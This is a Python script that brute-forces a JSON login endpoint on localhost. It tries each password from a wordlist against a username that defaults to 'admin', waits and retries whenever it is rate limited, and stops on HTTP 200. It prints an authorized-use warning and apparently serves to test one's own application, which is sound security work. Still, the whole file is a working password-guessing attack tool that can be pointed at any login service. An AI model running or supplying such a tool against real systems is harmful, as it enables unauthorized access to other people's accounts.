from colorama import init, Fore, Style
init(autoreset=True) 

import requests
import json
import argparse
import time
target_url = "http://localhost:8080/api/auth/login"

def attempt_login(username, password):
    headers = {
        "Content-Type": "application/json"}
    payload = {
        "username": username,
        "password": password,
        "rememberMe": False
    }
    response = requests.post(target_url, headers=headers, json=payload)
    return response

def main():

    print("=" * 60)
    print(" WARNING: FOR AUTHORIZED USE ONLY")
    print(" Unauthorized use violates Sri lanka's Computer Crimes Act")
    print("=" * 60)
    print()

    parser = argparse.ArgumentParser(description="Brute-force login attempts")
    parser.add_argument("-u", "--username", default="admin", help="Username to test")
    parser.add_argument("-w", "--wordlist", default="test-wordlist.txt", help="Path to wordlist file")
    args = parser.parse_args()

    username = args.username
    wordlist = args.wordlist

    with open(wordlist, "r") as f:
        for line in f:
            password = line.strip()
            print(f"[*] Testing {username}:{password}")
            
            while True:     
                response = attempt_login(username, password)
                if response.status_code == 200:
                    print(f"{Fore.GREEN}[+] Success! {username}:{password}")
                    break
                elif response.status_code == 400:
                    print(f"{Fore.RED}[-] Failed login attempt for {username}:{password}")
                    break
                elif response.status_code == 429:
                    print(f"{Fore.YELLOW}[-] Rate limited. Waiting 5 seconds ...")
                    time.sleep(5)  # Wait for 5 seconds before retrying

            if response.status_code == 200:
                break
if __name__ == "__main__":
    main()